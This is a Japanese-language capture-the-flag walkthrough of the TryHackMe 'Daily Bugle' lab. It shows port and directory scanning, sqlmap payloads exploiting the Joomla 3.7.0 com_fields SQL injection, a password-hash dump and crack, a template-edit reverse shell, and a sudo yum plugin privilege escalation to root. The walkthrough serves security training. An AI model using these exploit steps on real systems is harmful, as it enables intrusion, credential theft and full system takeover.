# Daily Bugle CTF

https://tryhackme.com/room/dailybugle

## Enumeration

```shell
TARGET=10.201.91.247
sudo bash -c "echo $TARGET   daily.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-63-51:~# nmap -sS -p- $TARGET

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 16:FF:CA:98:06:67 (Unknown)
```

```shell
root@ip-10-201-63-51:~# nmap -sS -sV -p22,80,3306 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
```

SSH, HTTP, MySQL

### ディレクトリ列挙

```sh
root@ip-10-201-63-51:~# dirb http://$TARGET

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Oct  2 05:08:24 2025
URL_BASE: http://10.201.91.247/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.201.91.247/ ----
==> DIRECTORY: http://10.201.91.247/administrator/
==> DIRECTORY: http://10.201.91.247/bin/
==> DIRECTORY: http://10.201.91.247/cache/
+ http://10.201.91.247/cgi-bin/ (CODE:403|SIZE:210)
==> DIRECTORY: http://10.201.91.247/components/
==> DIRECTORY: http://10.201.91.247/images/
==> DIRECTORY: http://10.201.91.247/includes/
+ http://10.201.91.247/index.php (CODE:200|SIZE:9280)
==> DIRECTORY: http://10.201.91.247/language/
==> DIRECTORY: http://10.201.91.247/layouts/
==> DIRECTORY: http://10.201.91.247/libraries/
==> DIRECTORY: http://10.201.91.247/media/
==> DIRECTORY: http://10.201.91.247/modules/
==> DIRECTORY: http://10.201.91.247/plugins/
+ http://10.201.91.247/robots.txt (CODE:200|SIZE:836)
==> DIRECTORY: http://10.201.91.247/templates/
==> DIRECTORY: http://10.201.91.247/tmp/

---- Entering directory: http://10.201.91.247/administrator/ ----
==> DIRECTORY: http://10.201.91.247/administrator/cache/
==> DIRECTORY: http://10.201.91.247/administrator/components/
==> DIRECTORY: http://10.201.91.247/administrator/help/
==> DIRECTORY: http://10.201.91.247/administrator/includes/
+ http://10.201.91.247/administrator/index.php (CODE:200|SIZE:4846)
==> DIRECTORY: http://10.201.91.247/administrator/language/
==> DIRECTORY: http://10.201.91.247/administrator/logs/
==> DIRECTORY: http://10.201.91.247/administrator/modules/
==> DIRECTORY: http://10.201.91.247/administrator/templates/

---- Entering directory: http://10.201.91.247/bin/ ----
+ http://10.201.91.247/bin/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/cache/ ----
+ http://10.201.91.247/cache/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/components/ ----
+ http://10.201.91.247/components/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/images/ ----
==> DIRECTORY: http://10.201.91.247/images/banners/
==> DIRECTORY: http://10.201.91.247/images/headers/
+ http://10.201.91.247/images/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/includes/ ----
+ http://10.201.91.247/includes/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/language/ ----
+ http://10.201.91.247/language/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/layouts/ ----
+ http://10.201.91.247/layouts/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.201.91.247/layouts/joomla/
==> DIRECTORY: http://10.201.91.247/layouts/libraries/
==> DIRECTORY: http://10.201.91.247/layouts/plugins/

---- Entering directory: http://10.201.91.247/libraries/ ----
==> DIRECTORY: http://10.201.91.247/libraries/cms/
+ http://10.201.91.247/libraries/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.201.91.247/libraries/joomla/
==> DIRECTORY: http://10.201.91.247/libraries/legacy/
==> DIRECTORY: http://10.201.91.247/libraries/vendor/

---- Entering directory: http://10.201.91.247/media/ ----
==> DIRECTORY: http://10.201.91.247/media/cms/
==> DIRECTORY: http://10.201.91.247/media/contacts/
==> DIRECTORY: http://10.201.91.247/media/editors/
+ http://10.201.91.247/media/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.201.91.247/media/mailto/
==> DIRECTORY: http://10.201.91.247/media/media/
==> DIRECTORY: http://10.201.91.247/media/system/

---- Entering directory: http://10.201.91.247/modules/ ----
+ http://10.201.91.247/modules/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/plugins/ ----
==> DIRECTORY: http://10.201.91.247/plugins/authentication/
==> DIRECTORY: http://10.201.91.247/plugins/captcha/
==> DIRECTORY: http://10.201.91.247/plugins/content/
==> DIRECTORY: http://10.201.91.247/plugins/editors/
==> DIRECTORY: http://10.201.91.247/plugins/extension/
==> DIRECTORY: http://10.201.91.247/plugins/fields/
+ http://10.201.91.247/plugins/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.201.91.247/plugins/installer/
==> DIRECTORY: http://10.201.91.247/plugins/search/
==> DIRECTORY: http://10.201.91.247/plugins/system/
==> DIRECTORY: http://10.201.91.247/plugins/user/

---- Entering directory: http://10.201.91.247/templates/ ----
+ http://10.201.91.247/templates/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://10.201.91.247/templates/system/

---- Entering directory: http://10.201.91.247/tmp/ ----
+ http://10.201.91.247/tmp/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/administrator/cache/ ----
+ http://10.201.91.247/administrator/cache/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/administrator/components/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/administrator/help/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/administrator/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/administrator/language/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/administrator/logs/ ----
+ http://10.201.91.247/administrator/logs/index.html (CODE:200|SIZE:31)

---- Entering directory: http://10.201.91.247/administrator/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/administrator/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/images/banners/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/images/headers/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/layouts/joomla/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/layouts/libraries/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/layouts/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/libraries/cms/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/libraries/joomla/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/libraries/legacy/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/libraries/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/media/cms/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/media/contacts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/media/editors/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/media/mailto/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/media/media/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/media/system/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/authentication/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/captcha/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/editors/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/extension/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/fields/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/installer/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/search/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/system/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/plugins/user/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/templates/system/ ----
==> DIRECTORY: http://10.201.91.247/templates/system/css/
==> DIRECTORY: http://10.201.91.247/templates/system/html/
==> DIRECTORY: http://10.201.91.247/templates/system/images/
+ http://10.201.91.247/templates/system/index.php (CODE:200|SIZE:0)

---- Entering directory: http://10.201.91.247/templates/system/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/templates/system/html/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.201.91.247/templates/system/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
```

/Administrator で、Joomla　の管理ログイン画面が表示された。

## /Administrator

stackoverflow で[バージョンの確認方法](https://stackoverflow.com/questions/28091116/how-to-get-joomla-version-by-http)を見つけた。

/language/en-GB/en-GB.xml

```xml
<metafile version="3.7" client="site">
<name>English (en-GB)</name>
<version>3.7.0</version>
<creationDate>April 2017</creationDate>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>Copyright (C) 2005 - 2017 Open Source Matters. All rights reserved.</copyright>
<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
<description>
<![CDATA[ en-GB site language ]]>
</description>
<metadata>
<name>English (en-GB)</name>
<nativeName>English (United Kingdom)</nativeName>
<tag>en-GB</tag>
<rtl>0</rtl>
<locale>en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom</locale>
<firstDay>0</firstDay>
<weekEnd>0,6</weekEnd>
<calendar>gregorian</calendar>
</metadata>
<params/>
</metafile>
```

バージョン 3.7.0 と判明。

## Joomla! 3.7.0 - 'com_fields' SQL Injection

3.7.0 にSQLi脆弱性がある。  
https://www.exploit-db.com/exploits/42033

metasploitのモジュールを試したが、うまくいかなかった。

```sh
msf6 exploit(unix/webapp/joomla_comfields_sqli_rce) > set RHOSTS 10.201.91.247
RHOSTS => 10.201.91.247
msf6 exploit(unix/webapp/joomla_comfields_sqli_rce) > set LHOST 10.11.146.32
LHOST => 10.11.146.32
msf6 exploit(unix/webapp/joomla_comfields_sqli_rce) > run
[*] Started reverse TCP handler on 10.11.146.32:4444 
[-] Exploit aborted due to failure: unknown: 10.201.91.247:80 - Error retrieving table prefix
[*] Exploit completed, but no session was created.
```

`*Instead of using SQLMap, why not use a python script!*` と書かれているが、sqlmapを試してみる。

```sh
sqlmap -u "http://daily.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 2746 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2805 FROM(SELECT COUNT(*),CONCAT(0x716b7a7071,(SELECT (ELT(2805=2805,1))),0x7171706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 1089 FROM (SELECT(SLEEP(5)))KoEo)
---
[13:57:57] [INFO] the back-end DBMS is MySQL
[13:57:57] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:57:59] [INFO] fetching database names
[13:58:00] [INFO] retrieved: 'information_schema'
[13:58:01] [INFO] retrieved: 'joomla'
[13:58:01] [INFO] retrieved: 'mysql'
[13:58:01] [INFO] retrieved: 'performance_schema'
[13:58:02] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```

テーブル名を特定

```sh
$ sqlmap -u "http://daily.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomla --tables

Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+
```

列名を特定

```sh
$ sqlmap -u "http://daily.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomla -T #__users --dump --batch

Database: joomla
Table: joomla.#__users
[5 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| name     | non-numeric |
| email    | non-numeric |
| id       | numeric     |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+
```

username, password 列をダンプ

```sh
$ sqlmap -u "http://daily.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomla -T '#__users' -C "username,password" --dump

Database: joomla
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| jonah    | $2y$10$0veO/JSFh438...[REDACTED] |
+----------+--------------------------------------------------------------+
```

bashcatでクラック成功。/administrator でログインできた。  
SSHではログインできなかった。

```sh
.\hashcat.exe -m 3200 hash.txt rockyou.txt
```

## RCE

ダッシュボードからテンプレートを編集、index.php を pentestmonkey.php に置き換える。テンプレートプレビューを選択したら実行された。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.91.247] 40794
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:59:27 up  1:56,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

## 権限昇格１

```sh
ls -al /home
total 0
drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
```

configuration.php でパスワードを発見。

```sh
cat /var/www/html/configuration.php

...
public $password = '[REDACTED]'; 
```

SSH接続できた。

```sh
$ ssh jjameson@10.201.91.247             
jjameson@10.201.91.247's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ 
```

## 権限昇格２

yum を sudo で実行できる。

```sh
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

エクスプロイト

```sh
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo /usr/bin/yum -c $TF/x --enableplugin=y
```

rootシェル取得成功

```sh
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 難易度 Hard にしては簡単だった印象。
- wordpress と同じように、joomla もテンプレート編集によりRCE可能なことを学んだ。
- joomla 3.7.0 の SQLi を攻撃するには、下記スクリプトを使うのが簡単だったらしい。

https://github.com/XiphosResearch/exploits/tree/master/Joomblah

ほんの数秒で完了するので、次からはこれを使う。

```sh
$ python2 ./ex.py http://daily.thm/
                                                                                                                                                                                                                                      
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/[REDACTED]', '', '']
  -  Extracting sessions from fb9j5_session
 [$] Found session ['811', 'a87uclhsivg382qgstqrvceb74', 'jonah']
```
